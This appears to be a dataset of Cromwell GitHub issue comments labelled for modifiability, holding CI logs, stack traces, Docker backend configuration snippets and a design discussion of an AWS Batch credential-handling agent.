Modifiability,"ationSchema=true |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1522,config,configuration,1522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['config'],['configuration']
Modifiability,"aven't investigated, but I also have some concerns over whether this mechanism would require significant rework of the process input/output and return code. It looks like @delagoya may have considered this in the batch-task-runner repo, but I'm not clear on this after the limited time I've had reviewing the repo. So, with that in mind, I spent a bit of time researching the ""always on sidecar"" approach, which I'll reference as ""cromwell agent"" moving forward for clarity. I took a look at the limitations of the permissions issue I mentioned above, and I believe I have a workable solution. The high level process would work like this:. 0. Each host runs the cromwell agent container similar to the way the ecs-agent operates today; 1. The cromwell agent container listens to the system events as described above; 2. When a cromwell task is started, the cromwell agent container will pause the target container (cromwell task) immediately; 3. It can then inspect the container and use the ECS ""AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"" in conjunction with the ecs-agent container credentials endpoint at 169.254.170.2 to fetch the **target container credentials**; 4. Using the target container credentials, we can localize inputs, then unpause the target container; 5. Upon completion of the task (we should see this from the system events stream), we can then delocalize outputs. This process feels workable with the following advantages:. * Minimal changes to the Cromwell code base/the agent can be developed and maintained separately; * Per-task IAM roles; * No changes needed to Cromwell task definitions or containers; * Cromwell task supervision stays within AWS Batch and Cromwell; * AWS Batch Job Definition configuration does not have to pass through an intermediary. Right now I have a POC to accomplish through step 3. Unless there are objections I'm going to continue to prototype to ensure 4 and 5 work as expected, then we can make a final call either on this thread or in a meeting.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-405738068:3113,config,configuration,3113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-405738068,1,['config'],['configuration']
Modifiability,bExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); 	at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.r,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:3269,Config,ConfigAsyncJobExecutionActor,3269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,bb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatc,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99771,adapt,adapted,99771,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['adapt'],['adapted']
Modifiability,cc @rhpvorderman @gbggrant who might be interested in the singularity aspects of this change to config backend.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-642654094:96,config,config,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-642654094,1,['config'],['config']
Modifiability,"cess by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:255); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:251); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:62); 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:4311,adapt,adapted,4311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['adapt'],['adapted']
Modifiability,"ch size of 100000; [2018-10-23 17:48:55,36] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-10-23 17:48:55,49] [info] Running with database db.url = jdbc:hsqldb:mem:35603602-72c4-4c47-8662-7fdf49e59cf1;shutdown=false;hsqldb.tx=mvcc; [2018-10-23 17:48:55,95] [info] Slf4jLogger started; [2018-10-23 17:48:56,03] [info] Pre Processing Workflow...; [2018-10-23 17:48:56,20] [info] Pre-Processing /home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl; [2018-10-23 17:49:21,60] [info] Pre Processing Inputs...; [2018-10-23 17:49:21,78] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-5deb9cb"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-10-23 17:49:21,93] [info] Metadata summary refreshing every 2 seconds.; [2018-10-23 17:49:22,12] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,84] [info] Retrieved 1 wo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:2964,config,configured,2964,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['config'],['configured']
Modifiability,"cher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba02308",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2414,config,configuration,2414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['config'],['configuration']
Modifiability,"cid`, _waits_ for the docker container to finish and then manually moves the `rc` file to the expected location. ### My misunderstanding. This docker script erroneously led me to believe that Cromwell needs job identifier and it uses some mechanism to continually check the status of that job. But in fact Cromwell doesn't really poll the workload manager, but my understanding from #1499 is that it actively polls the filesystem, looking for the `rc` file within the execution directory (potentially `stdout` too if its looking for the job id). This is also logically verified by looking at the `script` file that Cromwell generates, the way it collects the return code and places it in the expected directory. - Based on my initial incorrect understanding, I then believed if I couldn't get the containerId, then how would Cromwell know that the job has actually finished. ### My additional errors. These tended to redirect me away from the actual misunderstanding. . 1. In the udocker config I [posted before](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454569364) (corrected with comment), I was accidentally providing the `--entry-point` param, which was causing an interactive shell to open, stopping the rest of the script from executing. 2. I failed to notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_us",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:1533,config,config,1533,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['config'],['config']
Modifiability,"cificity_oncotate_oncotated_target_seg_gt_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_oncotate/SM-74ND9.per_target.oncotated.txt"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_small_sens_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.small_segs.tsv"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_del_sens_prec_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.del.tsv""; },; ""id"": ""020aa0e3-d12f-4085-b8a7-1de06c8df598""; }; [INFO] [12/08/2016 21:02:52.660] [cromwell-system-akka.actor.default-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/crsp_validation_input_files/crsp_validation_from_cromwell.json.metadata.json; [INFO] [12/08/2016 21:02:52.719] [shutdownHook1] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [12/08/2016 21:02:52.720] [cromwell-system-akka.actor.default-dispatcher-34] [akka://cromwell-system/deadLetters] Message [cromwell.engine.workflow.WorkflowManagerActor$AbortAllWorkflowsCommand$] from Actor[akka://cromwell-system/deadLetters] to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Capturing latest dir...; 7d822ec4-ca21-4e05-94ad-9d16acd5e534; lichtens@lichtens-big:~/test_eval$; ```. Do you see it? Look at that last line! It's a prompt! Cromwell exited successfully!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352:3531,config,configuration,3531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352,1,['config'],['configuration']
Modifiability,"ckend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: wdl.draft2.parser.WdlParser$SyntaxError: ERROR: Variable docker does not reference any declaration in the task (line 50, col 7):. ${docker} ${docker_script}; ^. Task defined here (line 20, col 6):. task submit_docker {; ^. at wdl.draft2.model.WdlNamespace$.$anonfun$apply$55(WdlNamespace.scala:444); at scala.collection.TraversableLike$WithFilter.$anonfun$map$2(TraversableLike.scala:827); at scala.collection.immutable.List.foreach(List.scala:392); at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:826); at wdl.draft2.model.WdlNamespace$.$anonfun$apply$52(WdlNamespace.scala:442); at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); at scala.collection.Iterator.foreach(Iterator.scala:941); at scala.collection.Iterator.foreach$(Iterator.scala:941); at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); at scala.collection.IterableLike.foreach(IterableLike.scala:74); at scala.collection.IterableLike.foreach$(IterableLike.scala:73); at scala.collection.AbstractIterable.foreach(Iterable.scala:56); at sc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:6569,Variab,Variable,6569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Variab'],['Variable']
Modifiability,"cker_script; String docker_out; String docker_err. String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowIni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:3948,config,configWdlNamespace,3948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,2,"['Config', 'config']","['ConfigInitializationActor', 'configWdlNamespace']"
Modifiability,cker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4351,Config,ConfigInitializationActor,4351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"closing as I""m adding Config feature so technically ""in progress"". Not 100% comfortable w/ this workflow but we'll see how it goes",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303748565:22,Config,Config,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303748565,1,['Config'],['Config']
Modifiability,"com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf) to solve the problem, but maybe it is better to have a `post-docker` configuration which is added to the pipeline similar to the `script-epilogue`. This would make easier the configuration of docker runs, separating submission and checks. By now, I will use the following local configuration to continue my work with the cromwell runner:. ```; include required(classpath(""application"")). ## keep always the workflow logs; workflow-options.workflow-log-temporary: false. backend.providers.Local.config {; ## limit the number of jobs; concurrent-job-limit = 15; # set the root directory to the run; filesystems.local {; ## do not allow copy (huge files); localization: [""hard-link"", ""soft-link""]; caching.duplication-strategy: [""hard-link"", ""soft-link""]; }; # custom submit-docker to workaround detached container due to timeout in the virtual machine; # first, we do not remove the container until it really finishes (no --rm flag); # if the docker run command fails, then it runs docker wait to wait until it finishes and store the return code; # if the docker run command fails, then it runs docker wait to return the real exit code even if detached; # once it finishes, removes the docker container with docker rm; # finally, returns the ""real return code"" stored; submit-docker = """"""; docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; rc=$(docker wait `cat ${docker_cid}`); docker rm `cat ${docker_cid}`; exit $rc; """"""; }; ```. By the way, it looks like the configuration of the local backend in the docs is still under development (http://cromwell.readthedocs.io/en/develop/tutorials/LocalBackendIntro/). I think that this kind of things can be part of the docs if not included as default in the source code - let me know if I can do something to help documenting the local end, which I am using as my default one.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526:2364,config,configuration,2364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3370#issuecomment-371448526,1,['config'],['configuration']
Modifiability,"config.ConfigBackendLifecycleActorFactory"". . # The backend custom configuration. config {. . # Optional limits on the number of concurrent jobs. #concurrent-job-limit = 5. . # If true submits scripts to the bash background using ""&"". Only usefull for dispatchers that do NOT submit. # the job and then immediately return a scheduled job id. run-in-background = true. . # `temporary-directory` creates the temporary directory for commands. #. # If this value is not set explicitly, the default value creates a unique temporary directory, equivalent to:. # temporary-directory = ""$(mktemp -d \""$PWD\""/tmp.XXXXXX)"". #. # The expression is run from the execution directory for the script. The expression must create the directory. # if it does not exist, and then return the full path to the directory. #. # To create and return a non-random temporary directory, use something like:. # temporary-directory = ""$(mkdir -p /tmp/mydir && echo /tmp/mydir)"". . # `script-epilogue` configures a shell command to run after the execution of every command block. #. # If this value is not set explicitly, the default value is `sync`, equivalent to:. # script-epilogue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system 